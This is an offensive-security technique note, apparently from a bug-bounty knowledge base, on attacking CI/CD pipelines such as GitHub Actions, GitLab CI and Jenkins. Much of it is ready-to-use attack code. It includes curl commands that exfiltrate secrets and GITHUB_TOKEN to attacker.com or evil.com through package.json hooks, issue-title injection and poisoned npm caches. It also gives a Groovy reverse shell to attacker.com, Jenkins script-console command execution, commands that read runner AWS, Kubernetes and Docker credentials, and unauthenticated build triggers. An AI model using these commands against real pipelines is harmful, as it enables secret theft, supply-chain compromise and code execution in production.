---
id: "cicd-attacks"
title: "CI/CD Pipeline Attacks & Exploitation"
type: "technique"
category: "infrastructure"
subcategory: "cicd"
tags: ["cicd", "github-actions", "gitlab-ci", "jenkins", "pipeline", "supply-chain", "secrets", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["dependency-confusion", "cloud-misconfigurations"]
difficulty: "advanced"
updated: "2026-04-14"
---

# CI/CD Pipeline Attacks & Exploitation

## Why CI/CD is High Value
CI/CD pipelines have the keys to the kingdom: deployment credentials, signing keys, cloud access tokens, and database passwords. A compromised pipeline means code execution in production. Bounties: $10k–$100k+.

## Attack Surface

### 1. GitHub Actions — Poisoned Workflows
```yaml
# pull_request_target runs in the context of the BASE repo
# If a workflow uses pull_request_target + checks out PR code:

on:
  pull_request_target:  # ← Runs with base repo secrets

steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # ← Checks out attacker's code
  - run: npm install  # ← Attacker's package.json runs arbitrary code with secrets
```

```
# Attack: Fork the repo, modify package.json to exfil secrets
# The workflow runs YOUR code with THEIR secrets

# Exfil in package.json scripts:
"scripts": {
  "install": "curl https://attacker.com/exfil?secrets=$SECRET_KEY"
}
```

### 2. GitHub Actions — Expression Injection
```yaml
# Vulnerable: User-controlled values in run: blocks
- run: echo "Issue title: ${{ github.event.issue.title }}"

# Attack: Create an issue with title:
# "; curl https://evil.com/steal?token=$GITHUB_TOKEN; echo "

# The workflow executes:
# echo "Issue title: "; curl https://evil.com/steal?token=ghp_xxx; echo ""

# Inject via: issue title, PR title, commit message, branch name,
# comment body, review body, label name
```

### 3. Secrets in Logs
```
# CI/CD systems mask known secrets in logs
# But they can't mask secrets they don't know about

# Check public build logs for:
# - Partial secret exposure (masking failures)
# - Environment variable dumps
# - Debug output with credentials
# - API responses containing tokens
# - Error messages with connection strings

# GitHub Actions: Check artifacts for leaked secrets
# Download all artifacts from public repos:
gh run list --repo target/repo --limit 20
gh run download <run_id> --repo target/repo
```

### 4. Jenkins Exploitation
```
# Default Jenkins at /jenkins or port 8080
# Common misconfigurations:

# Anonymous access to script console:
curl https://target.com/jenkins/script -d 'script=println "whoami".execute().text'

# Credential extraction:
curl https://target.com/jenkins/credentials/

# Build history with secrets:
curl https://target.com/jenkins/job/deploy/lastBuild/console

# API token extraction (if authenticated):
curl https://target.com/jenkins/me/configure
# Look for API tokens in page source

# Groovy reverse shell via script console:
String host="attacker.com";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
```

### 5. GitLab CI — Shared Runners
```yaml
# If shared runners are used, other projects on same runner can:
# - Read files from previous builds (cache poisoning)
# - Access Docker socket if runner uses Docker executor
# - Read environment variables from other projects

# .gitlab-ci.yml exploitation:
# Fork a project, modify .gitlab-ci.yml:
script:
  - env | sort  # Dump all environment variables
  - cat /etc/hostname
  - ls -la /var/run/docker.sock  # Check Docker socket access
  - find / -name "*.key" -o -name "*.pem" 2>/dev/null
```

### 6. Build Cache Poisoning
```
# CI/CD caches are shared across builds
# Poison the cache to inject malicious code:

# 1. Find cached dependency directories (node_modules, .pip, .m2)
# 2. Submit PR that modifies cached content
# 3. Malicious cache persists across future builds

# npm cache poisoning:
# Modify node_modules/popular-package/index.js in cache
# Add: require('child_process').execSync('curl https://evil.com/exfil?env=' + JSON.stringify(process.env))

# This executes on every subsequent build that uses the cache
```

### 7. Artifact Exploitation
```
# Build artifacts often contain:
# - Compiled binaries with hardcoded secrets
# - Configuration files with production credentials
# - Docker images with embedded keys
# - Source maps revealing internal code

# Check public artifact repositories:
# GitHub: Releases, Actions artifacts
# GitLab: Package registry, job artifacts
# Jenkins: Build artifacts, archived files

# Docker images from CI/CD:
docker pull target/app:latest
# Extract and search for secrets:
docker save target/app:latest | tar -xf -
grep -r "password\|secret\|key\|token" . --include="*.json" --include="*.yaml" --include="*.env"
```

### 8. Self-Hosted Runner Compromise
```
# Self-hosted GitHub Actions runners persist between jobs
# Previous job's files may still be on disk

# Check for leftover credentials:
find /home/runner -name ".env" -o -name "*.key" -o -name "credentials*" 2>/dev/null
cat /home/runner/.docker/config.json  # Docker registry creds
cat /home/runner/.kube/config  # Kubernetes access
cat /home/runner/.aws/credentials  # AWS keys

# If runner has Docker access:
docker ps  # See other containers
docker exec -it <container> /bin/sh  # Access other workloads
```

### 9. Webhook Exploitation
```
# CI/CD webhooks trigger builds on events
# If webhook secret is weak or missing:

# Trigger arbitrary builds:
curl -X POST https://target.com/jenkins/job/deploy/build \
  -H "Content-Type: application/json"

# Inject build parameters:
curl -X POST https://target.com/jenkins/job/deploy/buildWithParameters \
  -d "DEPLOY_ENV=production&BRANCH=attacker-branch"

# GitHub webhook with no secret verification:
# Forge a push event to trigger a workflow with attacker-controlled ref
```

### 10. Dependency Proxy Attacks
```
# Many CI/CD systems use internal dependency proxies (Nexus, Artifactory)
# If the proxy is misconfigurable:

# 1. Register a package with the same name as an internal package
# 2. If the proxy checks public registry first → your package executes
# 3. Your package runs with CI/CD credentials

# Check if the proxy is exposed:
curl https://target.com/nexus/
curl https://target.com/artifactory/
curl https://target.com/npm-registry/
```

## Deep Dig Prompts
```
Given this CI/CD setup [describe]:
1. Check all workflow files for expression injection (user-controlled values in run:)
2. Check for pull_request_target with code checkout (secret exposure)
3. Look for public build logs/artifacts containing secrets
4. Test webhook endpoints for unauthenticated build triggers
5. Check for shared runner cache poisoning vectors
6. Examine Docker/container access from build environment
```

## Tools
- truffleHog / gitleaks (secrets in repos)
- gh CLI (download artifacts, view workflows)
- Custom scripts for expression injection testing
- Docker for image layer analysis

## Key Indicators
- Public `.github/workflows/` directory
- `pull_request_target` trigger in any workflow
- `${{ github.event.* }}` in `run:` blocks
- Jenkins/GitLab accessible without auth
- Build logs publicly accessible
